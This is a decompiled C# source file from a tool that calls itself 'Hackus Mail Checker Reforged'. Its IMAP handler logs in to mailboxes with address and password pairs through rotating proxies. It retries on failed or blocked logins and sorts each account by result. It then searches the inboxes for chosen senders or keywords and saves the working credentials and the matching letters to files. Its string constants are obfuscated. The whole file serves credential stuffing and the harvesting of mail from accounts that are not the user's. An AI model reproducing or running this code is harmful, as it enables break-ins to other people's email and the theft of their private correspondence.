using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Sockets;
using System.Text.RegularExpressions;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Mail.Utilities;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net.Mail.IMAP
{
	// Token: 0x0200011D RID: 285
	public class ImapHandler : IMailHandler
	{
		// Token: 0x170001BE RID: 446
		// (get) Token: 0x060008F3 RID: 2291 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x060008F4 RID: 2292 RVA: 0x0000B7E1 File Offset: 0x000099E1
		public ImapHandler(Mailbox mailbox, Server server)
		{
			this._mailbox = mailbox;
			this._server = server;
		}

		// Token: 0x060008F5 RID: 2293 RVA: 0x00035624 File Offset: 0x00033824
		public OperationResult Connect(ProxyClient proxyClient)
		{
			OperationResult result;
			try
			{
				this._tcpClient = proxyClient.CreateConnection(this._server.Hostname, this._server.Port, null);
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					result = OperationResult.Ok;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (SocketException ex)
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch
			{
				if (this._tcpClient != null && this._tcpClient.Connected)
				{
					this._tcpClient.DisposeObject();
				}
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x060008F6 RID: 2294 RVA: 0x000356E8 File Offset: 0x000338E8
		public OperationResult Login(out ExceptionType exceptionType)
		{
			exceptionType = ExceptionType.Undefined;
			this._imapClient = new ImapClient();
			int num = CheckerSettings.Instance.Timeout * 1000;
			this._imapClient.ConnectTimeout = num;
			this._imapClient.ReadWriteTimeout = num;
			OperationResult result;
			try
			{
				this._imapClient.Connect(this._server.Hostname, this._server.Port, this._server.Socket == Hackus_Mail_Checker_Reforged.Models.Enums.SocketType.SSL, this._tcpClient);
				this.WaitPause();
				this._imapClient.Authenticate(this._mailbox.Address, this._mailbox.Password);
				result = OperationResult.Ok;
			}
			catch (SocketException ex)
			{
				if (ex.SocketErrorCode == SocketError.HostNotFound)
				{
					result = OperationResult.HostNotFound;
				}
				else
				{
					result = OperationResult.Error;
				}
			}
			catch (MailException exception)
			{
				if (exception.IsServerDisabled())
				{
					result = OperationResult.ServerDisabled;
				}
				else if (exception.IsBlocked())
				{
					result = OperationResult.Blocked;
				}
				else
				{
					result = OperationResult.Bad;
				}
			}
			catch
			{
				result = OperationResult.Error;
			}
			return result;
		}

		// Token: 0x060008F7 RID: 2295 RVA: 0x000357F0 File Offset: 0x000339F0
		public OperationResult SelectFolder(Folder folder)
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					this._imapClient.SelectFolder(folder);
					return OperationResult.Ok;
				}
				catch (AlertException)
				{
					return OperationResult.Bad;
				}
				catch
				{
				}
			}
			return OperationResult.Error;
		}

		// Token: 0x060008F8 RID: 2296 RVA: 0x00035848 File Offset: 0x00033A48
		public List<Folder> GetFolders()
		{
			List<Folder> list = null;
			switch (SearchSettings.Instance.FoldersMode)
			{
			case FoldersMode.Inbox:
				list = new List<Folder>
				{
					Folder.Parse(<Module>.smethod_3<string>(-762368918))
				};
				break;
			case FoldersMode.All:
				list = this.GetAllFolders();
				break;
			case FoldersMode.Custom:
				list = this.GetRequiredFolders();
				break;
			}
			if (list == null)
			{
				list = new List<Folder>
				{
					Folder.Parse(<Module>.smethod_3<string>(-762368918))
				};
			}
			if (!list.Any<Folder>())
			{
				list.Add(Folder.Parse(<Module>.smethod_6<string>(2132499449)));
			}
			this._allFolders = list;
			return list;
		}

		// Token: 0x060008F9 RID: 2297 RVA: 0x000358E8 File Offset: 0x00033AE8
		public List<Folder> GetAllFolders()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					return this._imapClient.GetAllFolders();
				}
				catch
				{
				}
			}
			return new List<Folder>
			{
				Folder.Parse(<Module>.smethod_3<string>(-762368918))
			};
		}

		// Token: 0x060008FA RID: 2298 RVA: 0x00035944 File Offset: 0x00033B44
		public List<Folder> GetRequiredFolders()
		{
			List<Folder> list = new List<Folder>();
			foreach (Folder folder in this.SearchSettings.Folders)
			{
				if (folder.IsEnabled)
				{
					list.Add(Folder.Parse(folder.Name));
				}
			}
			return list;
		}

		// Token: 0x060008FB RID: 2299 RVA: 0x000359B0 File Offset: 0x00033BB0
		public void SearchMessages()
		{
			this.ProcessSearch();
			foreach (KeyValuePair<Request, int> keyValuePair in this._foundMessages)
			{
				if (keyValuePair.Value != 0)
				{
					MailboxResult result = new MailboxResult(this._mailbox, keyValuePair.Key.ToString(), keyValuePair.Value);
					MailManager.Instance.AddResult(result);
					StatisticsManager.Instance.IncrementFound();
					FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, keyValuePair.Key.ToString(), keyValuePair.Value);
				}
			}
		}

		// Token: 0x060008FC RID: 2300 RVA: 0x00035A70 File Offset: 0x00033C70
		public void ProcessSearch()
		{
			List<Folder> folders = this.GetFolders();
			this._foldersLeft = new Stack<Folder>(folders);
			this._foundMessages = new Dictionary<Request, int>();
			while (this._foldersLeft.Any<Folder>())
			{
				Folder folder = this._foldersLeft.Pop();
				bool flag = false;
				if ((this._requestsLeft == null || !this._requestsLeft.Any<Request>()) && SearchSettings.Instance.Search)
				{
					this._requestsLeft = new Stack<Request>(SearchSettings.Instance.Requests);
				}
				for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
				{
					OperationResult operationResult = this.SelectFolder(folder);
					if (operationResult == OperationResult.Bad)
					{
						return;
					}
					if (operationResult == OperationResult.Ok)
					{
						flag = true;
						break;
					}
					if (!this.Reconnect())
					{
						return;
					}
				}
				if (!flag)
				{
					return;
				}
				if (SearchSettings.Instance.Search)
				{
					while (this._requestsLeft.Any<Request>())
					{
						Request request = this._requestsLeft.Pop();
						OperationResult operationResult2 = this.ProcessRequest(request);
						if (operationResult2 == OperationResult.Error)
						{
							if (this.Reconnect())
							{
								this._foldersLeft.Push(this._imapClient.SelectedFolder);
								this._requestsLeft.Push(request);
								break;
							}
							return;
						}
					}
				}
			}
		}

		// Token: 0x060008FD RID: 2301 RVA: 0x00035B9C File Offset: 0x00033D9C
		private OperationResult ProcessRequest(Request request)
		{
			SearchCondition condition = this.BuildSearchCondition(request);
			Uid[] array;
			OperationResult operationResult = this.Search(condition, out array);
			if (operationResult != OperationResult.Ok)
			{
				return operationResult;
			}
			if (array == null || array.Length == 0 || !this.IsAboveLimit(array.Length))
			{
				return OperationResult.Ok;
			}
			if (this.SearchSettings.DownloadLetters)
			{
				return this.ProcessRequestWithDownloading(request, array);
			}
			if (!this.IsAdditionalCheckRequired())
			{
				if (!this._foundMessages.ContainsKey(request))
				{
					this._foundMessages.Add(request, array.Length);
				}
				else
				{
					Dictionary<Request, int> foundMessages = this._foundMessages;
					foundMessages[request] += array.Length;
				}
				return OperationResult.Ok;
			}
			return this.ProcessRequestWithAdditionalCheck(request, array);
		}

		// Token: 0x060008FE RID: 2302 RVA: 0x00035C3C File Offset: 0x00033E3C
		private OperationResult ProcessRequestWithDownloading(Request request, Uid[] uids)
		{
			if (CheckerSettings.Instance.UsePop3Limit)
			{
				uids = uids.Take(CheckerSettings.Instance.Pop3Limit).ToArray<Uid>();
			}
			int num = 0;
			foreach (Uid uid in uids)
			{
				if (num >= this.SearchSettings.DownloadLettersLimit)
				{
					break;
				}
				MailMessage mailMessage = this.FetchMessage(uid, false, SearchSettings.Instance.SearchAttachments && SearchSettings.Instance.SearchAttachmentsMode == SearchAttachmentsMode.InDownloaded);
				if (mailMessage != null && this.IsValidMessage(mailMessage, request))
				{
					FileManager.SaveLetter(this._mailbox.Address, this._mailbox.Password, request.ToString(), mailMessage);
					mailMessage.Dispose();
					num++;
				}
			}
			if (!this._foundMessages.ContainsKey(request))
			{
				this._foundMessages.Add(request, num);
			}
			else
			{
				Dictionary<Request, int> foundMessages = this._foundMessages;
				foundMessages[request] += num;
			}
			return OperationResult.Ok;
		}

		// Token: 0x060008FF RID: 2303 RVA: 0x00035D30 File Offset: 0x00033F30
		private OperationResult ProcessRequestWithAdditionalCheck(Request request, Uid[] uids)
		{
			int num = 0;
			foreach (Uid uid in uids)
			{
				MailMessage mailMessage;
				if (request.Body != null)
				{
					mailMessage = this.FetchMessage(uid, false, true);
				}
				else if (this.SearchSettings.CheckDate)
				{
					mailMessage = this.FetchMessage(uid, true, true);
				}
				else
				{
					mailMessage = this.FetchFrom(uid);
				}
				if (mailMessage != null && this.IsValidMessage(mailMessage, request))
				{
					num++;
				}
			}
			if (num != 0 && this.IsAboveLimit(num))
			{
				if (!this._foundMessages.ContainsKey(request))
				{
					this._foundMessages.Add(request, num);
				}
				else
				{
					Dictionary<Request, int> foundMessages = this._foundMessages;
					foundMessages[request] += num;
				}
				return OperationResult.Ok;
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000900 RID: 2304 RVA: 0x00035DF0 File Offset: 0x00033FF0
		private OperationResult Search(SearchCondition condition, out Uid[] uids)
		{
			uids = null;
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				this.WaitPause();
				try
				{
					uids = this._imapClient.Search(condition);
					return OperationResult.Ok;
				}
				catch (MailException)
				{
					return OperationResult.Bad;
				}
				catch
				{
				}
			}
			return OperationResult.Error;
		}

		// Token: 0x06000901 RID: 2305 RVA: 0x00035E58 File Offset: 0x00034058
		private MailMessage FetchFrom(Uid uid)
		{
			MailMessage mailMessage = null;
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				this.WaitPause();
				try
				{
					mailMessage = this._imapClient.FetchFrom(uid);
					mailMessage.Folder = this._imapClient.SelectedFolder;
					return mailMessage;
				}
				catch (MailException)
				{
					return null;
				}
				catch
				{
				}
			}
			return mailMessage;
		}

		// Token: 0x06000902 RID: 2306 RVA: 0x00035ED0 File Offset: 0x000340D0
		private MailMessage FetchMessage(Uid uid, bool headersOnly, bool skipAdditionalParts = true)
		{
			MailMessage mailMessage = null;
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				this.WaitPause();
				try
				{
					mailMessage = this._imapClient.FetchMessage(uid, headersOnly, skipAdditionalParts);
					mailMessage.Folder = this._imapClient.SelectedFolder;
					return mailMessage;
				}
				catch (MailException)
				{
					return null;
				}
				catch
				{
				}
			}
			return mailMessage;
		}

		// Token: 0x06000903 RID: 2307 RVA: 0x00035F48 File Offset: 0x00034148
		private SearchCondition BuildSearchCondition(Request request)
		{
			SearchCondition searchCondition;
			if (request.Sender != null && request.Body != null)
			{
				searchCondition = SearchCondition.From(request.Sender).And(new SearchCondition[]
				{
					SearchCondition.Body(request.Body)
				});
			}
			else if (request.Sender == null)
			{
				searchCondition = SearchCondition.Body(request.Body);
			}
			else
			{
				searchCondition = SearchCondition.From(request.Sender);
			}
			if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null)
				{
					searchCondition &= SearchCondition.SentSince(SearchSettings.Instance.DateFrom.Value);
				}
				if (SearchSettings.Instance.DateTo != null)
				{
					searchCondition &= SearchCondition.SentBefore(SearchSettings.Instance.DateTo.Value.AddDays(1.0));
				}
			}
			return searchCondition;
		}

		// Token: 0x06000904 RID: 2308 RVA: 0x00036030 File Offset: 0x00034230
		private bool IsValidMessage(MailMessage message, Request request)
		{
			if (message == null)
			{
				return false;
			}
			if (request.Sender != null)
			{
				if (string.IsNullOrEmpty(message.Headers[<Module>.smethod_3<string>(-2078753114)]))
				{
					return false;
				}
				Match match = Regex.Match(message.Headers[<Module>.smethod_5<string>(-503726077)], <Module>.smethod_3<string>(1864021933));
				if (!match.Success)
				{
					return false;
				}
				if (!match.Groups[1].Value.ContainsIgnoreCase(request.Sender))
				{
					return false;
				}
			}
			if (request.Body != null)
			{
				if (message.Body == null)
				{
					return false;
				}
				if (!message.Body.ContainsIgnoreCase(request.Body))
				{
					return false;
				}
			}
			if (SearchSettings.Instance.CheckDate)
			{
				if (SearchSettings.Instance.DateFrom != null && message.Date < SearchSettings.Instance.DateFrom.Value)
				{
					return false;
				}
				if (SearchSettings.Instance.DateTo != null && message.Date > SearchSettings.Instance.DateTo.Value.AddDays(1.0))
				{
					return false;
				}
			}
			return true;
		}

		// Token: 0x06000905 RID: 2309 RVA: 0x0000B7F7 File Offset: 0x000099F7
		private bool IsAdditionalCheckRequired()
		{
			return CheckerSettings.Instance.UseRebruteDomainFilters && CheckerSettings.Instance.RebruteDomainFilters.Any((DomainFilter filter) => filter.Domain.EqualsIgnoreCase(this._mailbox.Domain) && filter.IsEnabled);
		}

		// Token: 0x06000906 RID: 2310 RVA: 0x00009B57 File Offset: 0x00007D57
		private bool IsAboveLimit(int count)
		{
			return !SearchSettings.Instance.UseSearchLimit || count >= SearchSettings.Instance.SearchLimit;
		}

		// Token: 0x06000907 RID: 2311 RVA: 0x00036168 File Offset: 0x00034368
		private bool Reconnect()
		{
			for (int i = 0; i < CheckerSettings.Instance.Rebrute + 1; i++)
			{
				if (ProxySettings.Instance.UseProxy)
				{
					OperationResult operationResult = this.CreateConnection();
					if (operationResult != OperationResult.HostNotFound)
					{
						if (operationResult != OperationResult.Error)
						{
							goto IL_24;
						}
					}
					return false;
				}
				IL_24:
				this.WaitPause();
				ExceptionType exceptionType;
				OperationResult operationResult2 = this.Login(out exceptionType);
				if (operationResult2 == OperationResult.Ok)
				{
					return true;
				}
				if (operationResult2 != OperationResult.Error)
				{
					if (operationResult2 == OperationResult.Blocked)
					{
						if (CheckerSettings.Instance.RebruteBlocked)
						{
							goto IL_4E;
						}
					}
					this._imapClient.Dispose();
					return false;
				}
				IL_4E:
				this._imapClient.Dispose();
			}
			return false;
		}

		// Token: 0x06000908 RID: 2312 RVA: 0x000361F8 File Offset: 0x000343F8
		private OperationResult CreateConnection()
		{
			OperationResult operationResult;
			do
			{
				this.WaitPause();
				ProxyClient proxy = ProxyManager.Instance.GetProxy();
				operationResult = this.Connect(proxy);
			}
			while (operationResult == OperationResult.Error);
			return operationResult;
		}

		// Token: 0x06000909 RID: 2313 RVA: 0x0000B822 File Offset: 0x00009A22
		public void Dispose()
		{
			this._imapClient.Dispose();
			this._foldersLeft = null;
			this._requestsLeft = null;
		}

		// Token: 0x0600090A RID: 2314 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x04000469 RID: 1129
		private TcpClient _tcpClient;

		// Token: 0x0400046A RID: 1130
		private Mailbox _mailbox;

		// Token: 0x0400046B RID: 1131
		private Server _server;

		// Token: 0x0400046C RID: 1132
		private ImapClient _imapClient;

		// Token: 0x0400046D RID: 1133
		private List<Folder> _allFolders;

		// Token: 0x0400046E RID: 1134
		private Stack<Folder> _foldersLeft;

		// Token: 0x0400046F RID: 1135
		private Stack<Request> _requestsLeft;

		// Token: 0x04000470 RID: 1136
		private Dictionary<Request, int> _foundMessages;
	}
}
